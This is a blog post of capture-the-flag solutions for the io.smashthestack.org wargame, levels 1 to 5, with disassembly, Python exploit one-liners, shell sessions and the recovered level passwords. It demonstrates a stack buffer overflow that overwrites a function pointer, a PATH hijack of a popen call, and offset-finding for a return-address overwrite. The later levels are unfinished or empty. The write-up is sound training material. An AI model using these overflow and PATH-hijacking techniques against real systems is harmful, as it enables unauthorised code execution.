---
layout: post
title: "IO | a wargame @ io.smashthestack.org - solutions level 1-?"
date: 2015-01-19
comments: true
categories:
---

A wargame consisting of challenges associated with reverse engineering and misc.

##Level01

___

```
.text:08048085                 call    puts
.text:0804808A                 call    fscanf
.text:0804808F                 cmp     eax, 271
.text:08048094                 jz      YouWin
.text:0804809A                 call    exit

```

```
level1@io:~$ /levels/level01 
Enter the 3 digit passcode to enter: 271
Congrats you found it, now read the password for level2 from /home/level2/.pass
sh-4.2$ cat /home/level2/.pass 
3ywr07ZFw5IsdKzU
```

##Level02
I didn't manage to come up with a solution completly on my own, I should read man pages more careful.
___
>man signal
"...also dividing the most negative
integer by -1 may generate SIGFPE."

The part where floating-point exception handler are set:

```
.text:0804858A mov     dword ptr [esp+4], offset catcher ; handler
.text:08048592 mov     dword ptr [esp], 8              ; sig
.text:08048599 call    _signal                         ; signal(SIGFPE, catcher)
```

The part where the division takes place that enables us to cause an exception with the information from the man-page:

```
.text:080485C9 mov     [esp+1Ch], eax                  ; 2nd arg
.text:080485CD mov     edx, ebx
.text:080485CF mov     eax, edx
.text:080485D1 sar     edx, 1Fh
.text:080485D4 idiv    dword ptr [esp+1Ch]             ; 1ndArg/2ndArg, so we must give min int/ -1

```

Everyone likes python :)

```
import sys

print " " + str(-sys.maxint - 1)+ " -1"

```

And the result:

```
level2@io:/tmp$ /levels/level02 $(python level02.py)
source code is available in level02.c

WIN!
sh-4.2$ cat /home/level3/.pass
IFd92yzOnSMv9tkX
```

##Level03

___

This one was a stack vulnerability in it's purest form.

```
.text:08048510 call    _strlen
.text:08048515 mov     [esp+8], eax                    ; size of argv[1]
.text:08048519 mov     eax, [ebp+arg_4]
.text:0804851C add     eax, 4
.text:0804851F mov     eax, [eax]
.text:08048521 mov     [esp+4], eax                    ; argv[1] adress
.text:08048525 lea     eax, [ebp+dest]                 ; destination buffer
.text:08048528 mov     [esp], eax
.text:0804852B call    _memcpy                         ; theres no limitation of the input argument size

```
Obviously we can write an arbitrary amount of data into the input buffer.
The stack layout:

```
.text:080484C8 var_5C          = dword ptr -5Ch
.text:080484C8 dest            = byte ptr -58h
.text:080484C8 var_C           = dword ptr -0Ch
.text:080484C8 arg_0           = dword ptr  8
.text:080484C8 arg_4           = dword ptr  0Ch
```

Var_C is later called, normally holding the adress to the function called bad.
We want to overwrite it with the adress to the function called good :)

```
.text:0804856D mov     eax, [ebp+var_C]
.text:08048570 call    eax
```

So how big is the offset?
58h-0C=4C which is 76 byte.
Lets verify it.

```python
>>> print "A"*76+"BBBB"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

![EAXOwned](/images/EAXLevel3.png)

Awesome!

Adress of good: 0x08048474

So our exploit will be:

```python
print "A"*76+\x74\x84\x04\x08"

```

```
level3@io:/levels$ ./level03 $(python -c "print \"A\"*76+\"\x74\x84\x04\x08\"")
This is exciting we're going to 0x8048474 Win.
sh-4.2$ cat /home/level4/.pass
nSwmULj2LpDnRGU2
```

##Level04

___
The program:

```c
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}

```

I'll didn't know how to solve it at all really, guess when I meet a similar problem in the future the PATH will be more accessible in my head :)
There's a good writeup here: [http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/](http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/)

```bash
level4@io:/tmp/fisk$ echo "cat /home/level5/.pass" >> whoami
level4@io:/tmp/fisk$ chmod 777 whoami
level4@io:/tmp/fisk$ PATH="/tmp/fisk:$PATH"
level4@io:/tmp/fisk$ echo $PATH
/tmp/fisk:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
level4@io:/tmp/fisk$ /levels/level04
Welcome LOoCy5PbKi63qXTh
```


##Level05

___

A basic overflow.

```
.text:080483E1 mov     [esp+4], eax                    ; src, argv[1]
.text:080483E5 lea     eax, [ebp+overFlowableBuff]
.text:080483EB mov     [esp], eax                      ; dest
.text:080483EE call    _strcpy                         ; strcpy(overFlowableBuff, argv[1])
```

As overFlowableBuff is a local variable the saved return adress are overflowable as it is located further down the stack.

So lets grab that offset with [Pattern.py](http://tomasuh.github.io/2015/01/17/Pattern-create-and-offset.html). 

```bash
tomasuh@crunch:~/programming/pentest/io$ pattern.py -pc 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

retn will pop 0x37654136 into EIP as shown here:

![Stack](/images/level5Stack.png)

```bash
tomasuh@crunch:~/programming/pentest/io$ pattern.py -pc 400 -po 0x37654136 -hl
Offset to pattern: 140
```

So lets craft our exploit with a execve(/bin/sh) shellcode.

This shit ain't done yet.


##Level06

___


##Level07

___


